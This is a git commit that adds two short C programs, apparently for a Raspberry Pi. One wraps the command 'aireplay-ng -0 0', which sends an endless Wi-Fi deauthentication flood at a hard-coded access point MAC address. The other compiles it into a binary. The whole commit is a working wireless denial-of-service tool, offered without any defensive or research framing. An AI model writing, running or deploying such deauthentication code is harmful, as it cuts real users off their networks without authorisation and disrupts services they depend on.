69dcc6d199006cb84e8a9c8c1a8142d11782a1e7
Fandi63 <100903182+Fandi63@users.noreply.github.com>
2023-09-06 18:08:05 +0100

    Add files via upload

---
+++ wifidea/wifidea.c
@@ -0,0 +1,6 @@
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    system("sudo aireplay-ng -0 0 -a D4:B7:09:04:39:88 wlan1");
+}
---
+++ wifidea/wifidea_build.c
@@ -0,0 +1,11 @@
+#include <stdio.h>
+#include <stdlib.h>
+
+
+int main() {
+
+   system("gcc wifidea.c -o /home/pi/wifidea/build/wifidea.bin");
+
+}
+
+
